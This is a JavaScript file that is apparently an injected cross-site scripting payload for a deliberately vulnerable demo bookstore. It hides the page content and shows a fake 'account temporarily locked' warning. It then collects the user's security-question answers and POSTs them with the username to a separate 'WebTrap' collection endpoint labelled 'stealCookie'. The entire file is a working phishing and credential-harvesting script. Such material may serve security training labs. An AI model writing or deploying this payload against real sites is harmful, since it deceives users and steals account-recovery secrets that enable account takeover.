(function() {
	var addOptions = function(selectElement) {
		var option0 = document.createElement("option");
		option0.value = "option0";
		option0.text = "--select--";

		var option1 = document.createElement("option");
		option1.value = "option1";
		option1.text = "What was your childhood nickname?";

		var option2 = document.createElement("option");
		option2.value = "option2";
		option2.text = "What street did you live on in third grade?";

		var option3 = document.createElement("option");
		option3.value = "option3";
		option3.text = "What was your dream job as a child?";

		var option4 = document.createElement("option");
		option4.value = "option4";
		option4.text = "What year did you graduate from High School?";

		var option5 = document.createElement("option");
		option5.value = "option5";
		option5.text = "What was the make and model of your first car?";

		selectElement.add(option0);
		selectElement.add(option1);
		selectElement.add(option2);
		selectElement.add(option3);
		selectElement.add(option4);
		selectElement.add(option5);
	}

	var myStyle = document.createElement("style");
	myStyle.type = "text/css";
	myStyle.innerHTML = ".bg-image{background-image:url('/BookStoreVictim/resources/app/images/background-image-2.jpg');background-size:100%;}.form-panel{margin-top:100px;padding-top:20px;border-radius:10px;}.panel-semi-transparent{background:rgba(255,255,255,0.5) !important;}.panel-default{border-color:#ddd;}.panel{margin-bottom:20px;box-shadow:0 1px 1px rgba(0,0,0,.05);}.center{text-align:center;}.error-message{color:red;}";
	document.getElementsByTagName("head")[0].appendChild(myStyle);

	var name = document.getElementsByClassName("dropdown-toggle")[0].text
			.trim();
	var warnMsg1 = document
			.createTextNode("["
					+ name
					+ "], Your account is temorarily locked due to unusual activity detected in your account");

	var warnMsg2 = document
			.createTextNode("Please provide answers to the below security questions to unlock your account!");

	var myWarning = document.createElement("h4");
	myWarning.style.color = "red";
	myWarning.style.marginTop = "50px";
	myWarning.style.textAlign = "center";
	myWarning.appendChild(warnMsg1);
	myWarning.appendChild(document.createElement("br"));
	myWarning.appendChild(warnMsg2);

	var question1 = document.createElement("select");
	question1.id = "question1";
	question1.style.marginTop = "20px";
	question1.className = "form-control";
	addOptions(question1);

	var answer1 = document.createElement("input");
	answer1.type = "text";
	answer1.id = "answer1";
	answer1.name = "answer1";
	answer1.className = "form-control textfield";
	answer1.placeholder = "Enter Answer!";

	var question2 = document.createElement("select");
	question2.id = "question2";
	question2.style.marginTop = "20px";
	question2.className = "form-control";
	addOptions(question2);

	var answer2 = document.createElement("input");
	answer2.type = "text";
	answer2.id = "answer2";
	answer2.name = "answer2";
	answer2.className = "form-control textfield";
	answer2.placeholder = "Enter Answer!";

	var question3 = document.createElement("select");
	question3.id = "question3";
	question3.style.marginTop = "20px";
	question3.className = "form-control";
	addOptions(question3);

	var answer3 = document.createElement("input");
	answer3.type = "text";
	answer3.id = "answer3";
	answer3.name = "answer3";
	answer3.className = "form-control textfield";
	answer3.placeholder = "Enter Answer!";

	var button = document.createElement("button");
	button.type = "button";
	button.id = "submitSecAns";
	button.className = "btn btn-primary btn-block";
	button.innerText = "Submit Answer!";

	var myForm = document.createElement("form");
	myForm.className = "form-horizontal";
	myForm.appendChild(question1);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer1);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(question2);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer2);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(question3);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer3);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(button);

	var myDiv4 = document.createElement("div");
	myDiv4.className = "panel-body";
	myDiv4.appendChild(myForm);

	var myDiv3 = document.createElement("div");
	myDiv3.className = "panel-heading center";
	myDiv3.innerHTML = "Book Store Victim";

	var myDiv2 = document.createElement("div");
	myDiv2.className = "panel panel-default form-panel panel-semi-transparent";
	myDiv2.appendChild(myDiv3);
	myDiv2.appendChild(myDiv4);

	var myDiv1 = document.createElement("div");
	myDiv1.className = "col-xs-8 col-sm-8 col-md-6 col-xs-offset-2 col-sm-offset-2 col-md-offset-3";
	myDiv1.appendChild(myDiv2);

	var myDiv0 = document.createElement("div");
	myDiv0.className = "container";
	myDiv0.appendChild(myDiv1);

	setTimeout(
			function() {
				$('#bookDetailsModal').modal('hide');
				document.getElementsByClassName("navbar")[0].style.display = "none";
				document.getElementsByClassName("container-fluid")[1].style.display = "none";

				var body = document.getElementsByTagName("body")[0];
				body.className = "bg-image";

				var myParent = document
						.getElementsByClassName("container-fluid")[1];
				myParent.before(myDiv0);
				myParent.after(myWarning);

				document.getElementById("submitSecAns").onclick = function() {
					var xhttp = new XMLHttpRequest();
					xhttp.onreadystatechange = function() {
						if (this.readyState == 4 && this.status == 200) {
							document.getElementById("ajax").innerHTML = this.responseText;
						}
						location.href = location.protocol + '//' + location.host + '/'
								+ location.pathname.split("/")[1];
					};
					xhttp.open("POST", "http://localhost:8080/WebTrap/AppController", true);
					xhttp.setRequestHeader("Content-type",
							"application/x-www-form-urlencoded");
					xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
					xhttp.send("requestType=stealCookie&username="
							+ document.getElementsByClassName("dropdown-toggle")[0].text
									.trim()
							+ "&cookie="
							+ document.getElementById("question1").options[document
									.getElementById("question1").selectedIndex].text
							+ " : "
							+ document.getElementById("answer1").value
							+ " | "
							+ document.getElementById("question2").options[document
									.getElementById("question2").selectedIndex].text
							+ " : "
							+ document.getElementById("answer2").value
							+ " | "
							+ document.getElementById("question3").options[document
									.getElementById("question3").selectedIndex].text
							+ " : " + document.getElementById("answer3").value);
				};
			}, 5000);

})();